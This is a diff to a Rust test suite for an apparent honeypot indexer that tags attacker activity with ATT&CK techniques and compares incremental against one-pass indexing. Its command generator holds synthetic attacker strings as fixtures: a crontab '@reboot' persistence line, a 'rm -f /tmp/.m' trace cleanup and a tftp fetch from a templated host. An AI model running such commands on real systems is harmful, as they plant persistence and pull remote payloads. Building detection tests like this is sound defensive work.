@@ -1329,7 +1329,7 @@ fn generated_command(rng: &mut Rng) -> String {
             "(crontab -l; echo \"@reboot /tmp/w.sh\") | crontab -; echo {}",
             rng.below(3)
         ),
-        8 => "ps aux | grep astats | grep -v grep | wc -l".into(),
+        8 => "ps aux | grep astats | grep -v grep | wc -l; rm -f /tmp/.m".into(),
         _ => format!("tftp -g -r x{} {host}", rng.below(3)),
     }
 }
@@ -1385,11 +1385,17 @@ async fn generated_event(
         )
         .await;
     } else if roll < 95 {
+        // A classified brute-force signal has no session: it is tagged on its source alone.
+        let signal = if rng.below(6) == 0 {
+            SignalType::SshBruteForce
+        } else {
+            SignalType::CatchallProbe
+        };
         append(
             pool,
             rng.pick(&IPS),
             rng.pick(&SENSORS),
-            SignalType::CatchallProbe,
+            signal,
             at,
             json!({}),
             None,
@@ -1411,7 +1417,18 @@ async fn generated_event(
 
 /// Every derived table, keyed by what identifies a row rather than by surrogate ids, as sorted text.
 async fn snapshot(pool: &PgPool) -> BTreeMap<&'static str, Vec<String>> {
-    let queries: [(&str, &str); 11] = [
+    let queries: [(&str, &str); 13] = [
+        (
+            "attack_tag",
+            "SELECT concat_ws('|', host(source_ip), session_id, technique_id, rule_id, event_id, \
+                matched, first_seen, last_seen, sightings) FROM attack_tag",
+        ),
+        (
+            "campaign_attack_tag",
+            "SELECT concat_ws('|', c.kind, c.key, t.technique_id, t.rule_id, t.event_id, \
+                t.artifact_sha256, t.matched) \
+                FROM campaign_attack_tag t JOIN campaign c ON c.id = t.campaign_id",
+        ),
         (
             "campaign",
             "SELECT concat_ws('|', kind, key, label, representative::text, rep_event_id, \
@@ -1443,7 +1460,7 @@ async fn snapshot(pool: &PgPool) -> BTreeMap<&'static str, Vec<String>> {
             "session",
             "SELECT concat_ws('|', session_id, host(source_ip), sensor, run, first_seen, \
                 last_seen, first_event_id, last_event_id, shapes, shape_chars, encode(last_shape, 'hex'), \
-                encode(chain, 'hex'), payload, entry_shapes, campaign_key, closed, pending_samples::text) \
+                encode(chain, 'hex'), payload, entry_shapes, campaign_key, closed, pending_samples::text, attack_pending::text) \
                 FROM campaign_session",
         ),
         (
@@ -1486,7 +1503,7 @@ async fn reset_index(pool: &PgPool) {
     sqlx::query(
         "TRUNCATE campaign, campaign_member, campaign_member_day, campaign_sensor, campaign_sample, \
                   campaign_session, campaign_watermark, campaign_scan_window, campaign_pending_fetch, \
-                  ioc, ioc_artifact_scan RESTART IDENTITY",
+                  ioc, ioc_artifact_scan, attack_tag, campaign_attack_tag RESTART IDENTITY",
     )
     .execute(pool)
     .await
@@ -1800,6 +1817,10 @@ async fn incremental_indexing_equals_one_pass_over_the_same_ledger(pool: PgPool)
         assert!(
             !incremental["campaign"].is_empty() && !incremental["session"].is_empty(),
             "seed {seed}: the generator produced nothing to compare"
+        );
+        assert!(
+            !incremental["attack_tag"].is_empty() && !incremental["campaign_attack_tag"].is_empty(),
+            "seed {seed}: the generator produced no ATT&CK tags to compare"
         );
         for row in &incremental["campaign"] {
             kinds_seen.insert(row.split('|').next().unwrap_or_default().to_string());
